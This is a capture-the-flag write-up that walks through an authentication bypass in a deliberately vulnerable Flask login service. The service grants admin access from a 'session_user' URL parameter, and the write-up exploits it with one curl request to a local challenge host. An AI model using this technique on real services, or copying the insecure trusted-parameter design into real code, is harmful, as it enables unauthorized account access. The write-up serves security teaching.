# Authentication Bypass 1

This set of challenge will teach you about an authentication bypass vulnerability, where an attacker can bypass the typical
flow of authentication of an application, **without** knowing the user's credentials.

In this challenge, we are given a login service. Let's take a look at the source.

```python
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? AS password""", [os.urandom(8)])
db.execute("""INSERT INTO users SELECT "guest" AS username, "password" AS password""")
```

We first see a `users` table being created in a database, with 2 usernames: `admin` and `guest`.
The password for guest is `password`, while the admin password will change each time the server is spun up.

Now let's take a look at the http endpoints being exposed:

```python
app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    return flask.redirect(f"""{flask.request.path}?session_user={username}""")
```

This `POST` endpoint seems to be where the server will accept a submitted form with their username and password.
If the username and its respective password is found in the database, it will redirect the user to:

```python
f"""{flask.request.path}session_user={username}"""
```

`flask.request.path` is simply the path of the current http request. In this case, it returns `/`.

So that redirects to this `GET` endpoint here:

```python
@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.args.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """
```

Here, you can see the html form that the user is supposed to fill out for their username and password, which will hit the `POST` endpoint above.
You can also see that if the `session_user` is set to `admin` it will greet you and give you the flag. 

But here is the thing: you don't NEED the POST message to craft the `session_user` argument and then redirect you to the `GET` endpoint.
You can do it yourself!

So, you can send a request like so:

```bash
curl 'challenge.localhost:80/?session_user=admin'
```

Which will give you the flag in the html response!
